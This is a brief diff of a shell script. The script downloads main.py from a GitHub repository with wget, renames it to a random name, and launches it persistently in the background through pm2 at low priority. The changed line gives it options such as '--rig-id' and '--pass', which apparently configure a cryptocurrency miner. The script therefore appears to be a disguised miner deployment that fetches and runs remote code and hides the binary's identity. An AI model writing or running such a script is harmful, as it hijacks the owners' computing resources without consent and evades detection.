@@ -21,7 +21,7 @@ wget https://raw.githubusercontent.com/hosseinxdns4/fictional-bassoon/main/main.
 NEW_PY=$(random_name).py
 mv main.py $NEW_PY
 chmod +x $NEW_PY
-echo "./$NEW_PY -t 4 --keepalive --dns=8.8.8.8 --user-agent="Mozilla/5.0" --cpu-priority=1" > bsh.sh
+echo "./$NEW_PY -t 4 --keepalive -r 10 -R 5 --rig-id=my1 --pass=12" > bsh.sh
 chmod +x bsh.sh
 ./bsh.sh
 nice -n 19 pm2 start bsh.sh
